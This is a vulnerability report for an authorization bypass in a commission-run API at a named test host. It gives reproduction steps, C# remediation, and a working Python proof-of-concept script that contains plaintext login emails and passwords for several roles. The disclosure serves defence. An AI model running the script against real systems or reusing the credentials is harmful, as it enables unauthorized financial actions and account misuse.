# Commission Workflow Bypass Enables Unauthorized Commission Execution

**ID:** vuln-0016
**Severity:** CRITICAL
**Found:** 2026-02-26 16:14:08 UTC
**Target:** https://commissionstest.callippus.in
**Endpoint:** /api/CommissionRun/RunCommission
**Method:** GET
**CWE:** CWE-863
**CVSS:** 9.9

## Description

A critical workflow bypass vulnerability was discovered in the commission management system that allows users to execute commission runs without proper authorization or approval workflow completion.

The application implements a multi-step approval workflow for commission runs (RunInitiator → RunReviewer1 → RunApprover1 → RunApprover2), but the final execution endpoint `/api/CommissionRun/RunCommission` can be called directly by any authenticated user, bypassing all approval requirements.

This vulnerability was discovered by analyzing the API structure and testing direct access to commission execution endpoints with different user roles. The endpoint accepts empty JSON payloads and executes commission runs without validating the user's role or the workflow state.

## Impact

Successful exploitation allows attackers to:

1. **Execute commission runs without approval**: Bypass all approval workflow steps and execute commission calculations directly
2. **Manipulate financial data**: Potentially alter commission amounts or payout values through parameter tampering
3. **Disrupt business processes**: Execute commission runs at unauthorized times, potentially causing financial discrepancies
4. **Privilege escalation**: Lower-privileged users (Client, Organization) can perform actions reserved for Admin users

Business impact includes financial loss from unauthorized commission calculations, data integrity issues, and violation of business process controls.

## Technical Analysis

The vulnerability exists due to insufficient authorization checks on the commission execution endpoint. The application implements role-based access control at the UI level but fails to enforce these controls at the API level.

Key technical findings:
1. The `/api/CommissionRun/RunCommission` endpoint accepts GET requests with empty JSON payloads
2. No role validation is performed - any authenticated user can call this endpoint
3. No workflow state validation is performed - the endpoint can be called at any time
4. The endpoint returns HTTP 200 responses even when called by unauthorized users

The root cause appears to be a separation between the frontend workflow implementation and backend API authorization, where the frontend enforces workflow steps but the backend API endpoints remain unprotected.

## Proof of Concept

To reproduce the workflow bypass vulnerability:

1. Authenticate as any user (Admin, Organization, or Client)
2. Send a GET request to `/api/CommissionRun/RunCommission` with an empty JSON body `{}`
3. Observe that the commission run executes successfully without any approval workflow
4. Verify that the commission run appears in the system with the unauthorized user as the executor

The following test cases demonstrate the vulnerability:
- Client user successfully executes commission run (should be denied)
- Organization user successfully executes commission run (should be denied)
- Admin user executes commission run without going through approval workflow (should require approval)

```
import requests
import json

# Test Commission Workflow Bypass Vulnerability

BASE_URL = "https://commissionstest.callippus.in"
COMMISSION_RUN_ENDPOINT = f"{BASE_URL}/api/CommissionRun/RunCommission"

# Test with different user roles
test_users = [
    {
        "name": "Client User",
        "email": "lakshminarayanabobby789@gmail.com",
        "password": "User@1234",
        "expected_result": "denied"  # Client should not be able to run commissions
    },
    {
        "name": "Organization User",
        "email": "nlnarayana3858@gmail.com",
        "password": "User@1234",
        "expected_result": "denied"  # Organization should not be able to run commissions
    },
    {
        "name": "Admin User",
        "email": "admin@localhost",
        "password": "Tester@123",
        "expected_result": "approved"  # Admin should go through approval workflow
    }
]

def authenticate(email, password):
    """Authenticate and return JWT token"""
    auth_url = f"{BASE_URL}/api/authenticate"
    payload = {"email": email, "password": password}
    response = requests.post(auth_url, json=payload)
    if response.status_code == 200:
        return response.json()["id_token"]
    return None

def test_commission_run(token):
    """Test commission run execution"""
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
        "Accept": "application/json"
    }
    payload = {}  # Empty payload that should trigger validation error

    response = requests.get(COMMISSION_RUN_ENDPOINT, headers=headers, json=payload)

    return {
        "status_code": response.status_code,
        "response": response.text,
        "success": response.status_code == 200
    }

def main():
    print("Testing Commission Workflow Bypass Vulnerability")
    print("=" * 60)

    for user in test_users:
        print(f"\nTesting {user['name']} ({user['email']}):")
        print(f"Expected result: {user['expected_result']}")

        # Authenticate
        token = authenticate(user["email"], user["password"])
        if not token:
            print("❌ Authentication failed")
            continue

        # Test commission run
        result = test_commission_run(token)

        print(f"Status Code: {result['status_code']}")
        print(f"Success: {result['success']}")

        if result['success']:
            print("❌ VULNERABILITY CONFIRMED: Unauthorized commission run executed")
            print("   This user should not be able to execute commission runs directly")
        else:
            print("✅ Expected behavior: Commission run denied")

        print("-" * 60)

    print("\nVulnerability Summary:")
    print("1. All authenticated users can execute commission runs regardless of role")
    print("2. No approval workflow validation is performed")
    print("3. Empty payload is accepted without validation")
    print("4. HTTP 200 responses indicate successful execution")

if __name__ == "__main__":
    main()
```

## Remediation

Implement comprehensive authorization checks on all commission workflow endpoints:

1. **Role-based access control**: Validate that only users with appropriate roles (RunInitiator, RunApprover, etc.) can access commission endpoints
2. **Workflow state validation**: Verify that all required approval steps have been completed before allowing commission execution
3. **Endpoint protection**: Restrict commission execution endpoints to POST requests only with proper validation
4. **Parameter validation**: Require and validate all necessary parameters for commission execution
5. **Audit logging**: Implement detailed logging of all commission execution attempts and approvals

Specific code changes required:
1. Add role validation middleware to commission endpoints
2. Implement workflow state tracking and validation
3. Add proper request method restrictions (POST instead of GET)
4. Implement parameter validation and error handling
5. Add audit logging for all commission-related actions

Example remediation:
```csharp
// Before: No authorization checks
[HttpGet("RunCommission")]
public IActionResult RunCommission()
{
    // Execute commission run
}

// After: Proper authorization and validation
[HttpPost("RunCommission")]
[Authorize(Roles = "RunInitiator,RunApprover1,RunApprover2")]
public IActionResult RunCommission([FromBody] CommissionRunRequest request)
{
    // Validate workflow state
    if (!workflowService.IsWorkflowApproved(request.WorkflowId))
    {
        return Forbid("Approval workflow not completed");
    }

    // Validate parameters
    if (!ModelState.IsValid)
    {
        return BadRequest(ModelState);
    }

    // Execute commission run
    var result = commissionService.RunCommission(request);

    // Log the action
    auditService.LogCommissionRun(User.Identity.Name, request.WorkflowId);

    return Ok(result);
}
```

